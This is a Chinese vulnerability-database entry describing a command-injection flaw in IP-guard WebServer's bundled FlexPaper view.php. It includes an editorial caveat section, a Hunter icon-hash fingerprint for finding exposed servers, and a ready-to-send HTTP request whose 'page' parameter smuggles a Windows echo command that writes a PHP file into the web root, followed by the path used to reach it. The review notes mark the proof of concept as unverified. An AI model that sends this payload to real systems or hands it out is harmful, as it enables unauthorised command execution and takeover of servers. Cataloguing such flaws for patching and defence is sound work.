---
source: "wy876 漏洞文库"
id: "vw-8865ee7a2a45e4dbe292cc61"
entity_id: "ve-8865ee7a2a45e4dbe292cc61"
schema_version: "1"
fofa_unverified: "web.icon=="
title: "IP-guard WebServer 远程命令执行漏洞"
product: "IP-guard WebServer内置FlexPaper"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Windows命令语法，含ipg_session；未给版本"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/IP-guard/IP-guardWebServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/opebo53vl523fg3s"
source_status: "recorded"
---

# IP-guard WebServer 远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：IP-guard WebServer内置FlexPaper
- 本文讨论：view.php page命令注入
- 版本、权限与配置前提：Windows命令语法，含ipg_session；未给版本
- 资料类型：FlexPaper命令注入请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 同555请求仅编码/输出名等变化，版本与修复信息更少
- 请求带会话但未说明是否必需；phpinfo文件访问是证据需响应，非任意命令结果文本
- FOFA元数据误标残缺Hunter语法
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 会话必要性和版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。IP-guard WebServer 存在远程命令执行漏洞。攻击者可利用该漏洞执行任意命令，获取服务器控制权限。

# 二、影响版本
+ IP-guard

# 三、资产测绘
+ hunter`web.icon=="210a3c89d4ab5effa18d6dd7a9627376"`
+ 特征


# 四、漏洞复现
```http
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?php+phpinfo();+?^>+>2.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ipg_session=uiki60dds9f9jop2jpj0vn8h22aa3e1o
Upgrade-Insecure-Requests: 1
```


获取命令执行结果

```plain
/ipg/static/appr/lib/flexpaper/php/2.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/opebo53vl523fg3s>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
